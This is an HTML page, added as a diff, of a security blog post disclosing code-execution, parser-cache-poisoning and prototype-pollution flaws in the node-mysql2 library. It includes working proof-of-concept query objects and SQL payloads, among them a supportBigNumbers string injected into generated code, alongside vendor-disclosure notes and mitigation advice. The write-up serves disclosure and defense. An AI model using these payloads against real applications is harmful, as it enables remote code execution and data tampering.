@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>MySQL2: Dangers of User-Defined Database Connections - Slonser Notes</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="
+The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.
+
+Introduction
+The node-mysql2 library is one of the most popular libraries for connecting to a database in JavaScript, with over 2 million installations per week." />
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content="//localhost:1313/posts/mysql2-attacker-configuration/">
+  <meta property="og:site_name" content="Slonser Notes">
+  <meta property="og:title" content="MySQL2: Dangers of User-Defined Database Connections">
+  <meta property="og:description" content="The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.
+Introduction The node-mysql2 library is one of the most popular libraries for connecting to a database in JavaScript, with over 2 million installations per week.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-03-26T00:00:00+03:00">
+    <meta property="article:modified_time" content="2024-03-26T00:00:00+03:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="MySQL2: Dangers of User-Defined Database Connections">
+  <meta name="twitter:description" content="The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.
+Introduction The node-mysql2 library is one of the most popular libraries for connecting to a database in JavaScript, with over 2 million installations per week.">
+
+        <link href="//localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="//localhost:1313/css/main.6a0f23ea50fd34b46fee262a5a68e17d458c51a2bc99ba1ba018065de6b180c3.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="//localhost:1313/css/dark.50b57e12d401420df23965fed157368aba37b76df0ecefd0b1ecd4da664f01a0.css" media="(prefers-color-scheme: dark)"  />
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="//localhost:1313/">Slonser Notes</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/posts/who-am-i/">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+  <article>
+    <div class="post-container">
+      
+      <div class="post-content">
+        <div class="title">
+          <h1 class="title">MySQL2: Dangers of User-Defined Database Connections</h1>
+          <div class="meta">Posted on Mar 26, 2024</div>
+        </div>
+        
+        <section class="body">
+          <blockquote>
+<p>The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.</p>
+</blockquote>
+<h1 id="introduction">Introduction</h1>
+<p>The node-mysql2 library is one of the most popular libraries for connecting to a database in JavaScript, with over 2 million installations per week.</p>
+<p>At the end of last year, I encountered an automation system that utilized the node-mysql2 library to connect to user databases and execute queries controlled by them.
+In this article, I want to discuss the issues it causes and provide you with their solutions.</p>
+<h1 id="basics">Basics</h1>
+<p>In the application I was researching, the user could establish a connection to their database and execute queries with it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#f92672">//</span> Simplified example
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> mysql <span style="color:#f92672">=</span> require(<span style="color:#e6db74">&#39;mysql2&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> connection <span style="color:#f92672">=</span> mysql<span style="color:#f92672">.</span>createConnection({
+</span></span><span style="display:flex;"><span>    host: userdata<span style="color:#f92672">.</span>host,
+</span></span><span style="display:flex;"><span>    user: userdata<span style="color:#f92672">.</span>user,
+</span></span><span style="display:flex;"><span>    database: userdata<span style="color:#f92672">.</span>db,
+</span></span><span style="display:flex;"><span>    password: userdata<span style="color:#f92672">.</span>password,
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>connection<span style="color:#f92672">.</span>query(userdata<span style="color:#f92672">.</span>query,reponseFunction)
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>Obviously, in this case, we cannot talk about standard SQL-related attack vectors since the connection belongs to us. Therefore, we should consider issues related to affecting other users data or server performance.</p>
+<h1 id="rce">RCE</h1>
+<p>As you might guess, I was able to find a way to execute arbitary code in such a configuration, but how is this possible?</p>
+<p>First, let&rsquo;s understand how the library works. In most cases, the first argument passed to the connection.query function is a string containing the query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>connection.query(&#34;SELECT 1;&#34;,reponseFunction)
+</span></span></code></pre></div><p>But actually, the first argument can also be an object, where in addition to the query itself, we can pass parameters for its processing:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>connection.query({sql:&#34;SELECT 1;&#34;, ... },reponseFunction)
+</span></span></code></pre></div><p>After that, the passed configuration parameters will be used by the response parsing <a href="https://github.com/sidorares/node-mysql2/blob/1609b5393516d72a4ae47196837317fbe75e0c13/lib/parsers/text_parser.js#L14C10-L14C21">function</a>.
+(It&rsquo;s also worth noting that these same parameters can be passed directly into the database connection, which can be useful if the query argument is filtered.)</p>
+<p>If you look closely, you will notice that this function involves code generation. MySQL2 generates a parsing function for each query, which is then cached for optimization purposes. This is important for understanding this article.</p>
+<p>I noticed that in most cases, it successfully sanitizes the data that enters the generated code. However, there is also a line:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>      return `packet.parseLengthCodedInt(${supportBigNumbers})`;
+</span></span></code></pre></div><p>The parameter supportBigNumbers is a number in a legitimate case, so it is not sanitized. However, are there any checks for this?</p>
+<p>A quick look at the code revealed that such checks are absent. This piece of code will be executed if the executed query returns a BIGNUMBER, so to achieve RCE, it is sufficient to pass the following object as the first argument:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> {sql:`SELECT INDEX_LENGTH FROM information_schema.tables LIMIT 1`, supportBigNumbers:&#34;console.log(1337)&#34;}
+</span></span></code></pre></div><p>As a result, you will see 1337 in the console after executing this database query.</p>
+<p><strong>!!! It&rsquo;s also important to understand that an object with a global prototype is used as a map. Therefore, you can use this as Prototype Pollution to achieve RCE. If the targeted application uses mysql2 and you achieve PP, you can also gain RCE.</strong></p>
+<h1 id="cache-poisoning">Cache Poisoning</h1>
+<p>The next vulnerability becomes accessible even in stricter application configurations. Its exploitation is possible even if the first argument query is checked to ensure it is a string.
+As I mentioned earlier, the library utilizes caching of generated response functions. Let&rsquo;s take a look at how it was <a href="https://github.com/sidorares/node-mysql2/blob/fd3d117da82cc5c5fa5a3701d7b33ca77691bc61/lib/parsers/parser_cache.js#L9">implemented</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>function keyFromFields(type, fields, options, config) {
+</span></span><span style="display:flex;"><span>  let res <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">$</span>{type}<span style="color:#960050;background-color:#1e0010">`</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">/$</span>{typeof options<span style="color:#f92672">.</span>nestTables}<span style="color:#960050;background-color:#1e0010">`</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">/$</span>{options<span style="color:#f92672">.</span>nestTables}<span style="color:#960050;background-color:#1e0010">`</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">/$</span>{options<span style="color:#f92672">.</span>rowsAsArray}<span style="color:#960050;background-color:#1e0010">`</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">/$</span>{options<span style="color:#f92672">.</span>supportBigNumbers <span style="color:#f92672">||</span> config<span style="color:#f92672">.</span>supportBigNumbers}<span style="color:#960050;background-color:#1e0010">`</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">/$</span>{options<span style="color:#f92672">.</span>bigNumberStrings <span style="color:#f92672">||</span> config<span style="color:#f92672">.</span>bigNumberStrings}<span style="color:#960050;background-color:#1e0010">`</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">/$</span>{typeof options<span style="color:#f92672">.</span>typeCast}<span style="color:#960050;background-color:#1e0010">`</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">/$</span>{options<span style="color:#f92672">.</span>timezone <span style="color:#f92672">||</span> config<span style="color:#f92672">.</span>timezone}<span style="color:#960050;background-color:#1e0010">`</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">/$</span>{options<span style="color:#f92672">.</span>decimalNumbers}<span style="color:#960050;background-color:#1e0010">`</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">/$</span>{options<span style="color:#f92672">.</span>dateStrings}<span style="color:#960050;background-color:#1e0010">`</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (let i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> fields<span style="color:#f92672">.</span>length; <span style="color:#f92672">++</span>i) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> field <span style="color:#f92672">=</span> fields[i];
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">+=</span> <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">/$</span>{field<span style="color:#f92672">.</span>name}:<span style="color:#f92672">$</span>{field<span style="color:#f92672">.</span>columnType}:<span style="color:#f92672">$</span>{field<span style="color:#f92672">.</span>length}:<span style="color:#f92672">$</span>{field<span style="color:#f92672">.</span>schema}:<span style="color:#f92672">$</span>{field<span style="color:#f92672">.</span>table}:<span style="color:#f92672">$</span>{field<span style="color:#f92672">.</span>flags}:<span style="color:#f92672">$</span>{field<span style="color:#f92672">.</span>characterSet}<span style="color:#960050;background-color:#1e0010">`</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> res;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>As you can see, keys are inserted into the string, and &ldquo;:&rdquo; is used as a delimiter. This is a poor implementation because the values passed into the key can also contain &ldquo;:&rdquo;. By exploiting this characteristic, one can manipulate the hashed function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  connection.query(
+</span></span><span style="display:flex;"><span>    &#39;SELECT information_schema.tables.TABLE_NAME,`tables:160:63/DATA_LENGTH:8:undefined::tables`.TABLE_ROWS FROM information_schema.tables INNER JOIN information_schema.tables AS `tables:160:63/DATA_LENGTH:8:undefined::tables` ON `tables:160:63/DATA_LENGTH:8:undefined::tables`.TABLE_ROWS!=information_schema.tables.TABLE_ROWS LIMIT 1;&#39;,
+</span></span><span style="display:flex;"><span>    function(err, results, fields) {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  );
+</span></span><span style="display:flex;"><span>  // Send another request and spwan new connection
+</span></span><span style="display:flex;"><span>  connection1.query(
+</span></span><span style="display:flex;"><span>    `SELECT TABLE_NAME, TABLE_ROWS, DATA_LENGTH FROM information_schema.tables LIMIT 1;`,
+</span></span><span style="display:flex;"><span>    function(err, results, fields) {
+</span></span><span style="display:flex;"><span>      console.log(results);
+</span></span><span style="display:flex;"><span>      console.log(fields);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  );
+</span></span></code></pre></div><p>You will see output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span>[ <span style="color:#960050;background-color:#1e0010">{</span> TABLE_NAME: <span style="color:#e6db74">&#39;ADMINISTRABLE_ROLE_AUTHORIZATIONS&#39;</span>, TABLE_ROWS: <span style="color:#ae81ff">0</span> <span style="color:#960050;background-color:#1e0010">}</span> ]
+</span></span><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">`</span>TABLE_NAME<span style="color:#f92672">`</span> <span style="color:#66d9ef">VARCHAR</span>(<span style="color:#ae81ff">64</span>) <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">`</span>TABLE_ROWS<span style="color:#f92672">`</span> <span style="color:#66d9ef">BIGINT</span>(<span style="color:#ae81ff">21</span>) <span style="color:#66d9ef">UNSIGNED</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">`</span>DATA_LENGTH<span style="color:#f92672">`</span> <span style="color:#66d9ef">BIGINT</span>(<span style="color:#ae81ff">21</span>) <span style="color:#66d9ef">UNSIGNED</span>
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>As evident, the fields of the second request include DATA_LENGTH, which, however, is absent in the results. This discrepancy arises because the first request stores in the cache a key <code>text/undefined/undefined/false/false/false/boolean/local/false/false/TABLE_NAME:253:undefined:information_schema:tables:20609:224/TABLE_ROWS:8:undefined::tables:160:63/DATA_LENGTH:8:undefined::tables:160:63</code> with an incorrect packet parser.</p>
+<p>This can be used to disrupt the logic of the application, sending data types that are not expected.</p>
+<p>Fixed in latest release.</p>
+<h1 id="prototype-poisoning--pollution">Prototype Poisoning / Pollution</h1>
+<p>Returning to the process of generating the function that parses the returned response, it can be observed that an object with a global prototype is used as the user-supplied <a href="https://github.com/sidorares/node-mysql2/blob/fd3d117da82cc5c5fa5a3701d7b33ca77691bc61/lib/parsers/text_parser.js#L134">value</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>parserFn(<span style="color:#e6db74">&#34;const result = {};&#34;</span>);
+</span></span></code></pre></div><p>Therefore, if you pass the following query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>SELECT CAST(&#39;{&#34;toString&#34;: {&#34;toString&#34;:true}, &#34;tags&#34;: {&#34;a&#34;: 1, &#34;b&#34;: null}}&#39; as JSON) AS __proto__;
+</span></span></code></pre></div><p>You will notice that the response prototype has changed</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Object.getPrototypeOf(results[0])
+</span></span><span style="display:flex;"><span>&gt; { tags: { a: 1, b: null }, toString: { toString: true } }
+</span></span></code></pre></div><p>his only controls a specific prototype, not the global one. However, if we have the ability to control the configuration, we can simply pass <code>nestTables: true</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>    } else if (options.nestTables === true) {
+</span></span><span style="display:flex;"><span>        lvalue = `result[${helpers.srcEscape(fields[i].table)}][${fieldName}]`;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>As many might understand, this will give us full prototype pollution.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>I informed the vendor about these issues 90 days ago and my intentions to publish this material on March 26th. Unfortunately, the vendor did not provide the necessary cooperation, ignoring my emails for months, so this material was released without the final fixes.</p>
+<p>Today, a <a href="https://github.com/sidorares/node-mysql2/releases/tag/v3.9.3">fix</a> was released that addresses the cache manipulation issue. However, the remaining problems remain relevant in the latest version.</p>
+<p>If you are using the library in the described scenarios, I strongly advise you to limit the connection parameters and the parameters passed in the query.</p>
+
+        </section>
+        <div class="post-tags">
+          
+          
+          
+        </div>
+      </div>
+
+      
+      
+    </div>
+
+    </article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/Slonser" rel="me" title="GitHub"><svg class="feather">
+   <use href="/svg/feather-sprite.51cf5647cb1987f769b616558f2620fd9423d72058490231b391bf6aa3744b55.svg#github" />
+</svg></a><a class="border"></a><a class="soc" href="https://twitter.com/slonser_" rel="me" title="Twitter"><svg class="feather">
+   <use href="/svg/feather-sprite.51cf5647cb1987f769b616558f2620fd9423d72058490231b391bf6aa3744b55.svg#twitter" />
+</svg></a><a class="border"></a><a class="soc" href="https://t.me/Slonser" rel="me" title="Telegram"><svg class="feather">
+   <use href="/svg/feather-sprite.51cf5647cb1987f769b616558f2620fd9423d72058490231b391bf6aa3744b55.svg#telegram" />
+</svg></a><a class="border"></a></div>
+  <div class="footer-info">
+    2026  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+</div>
+    </body>
+</html>
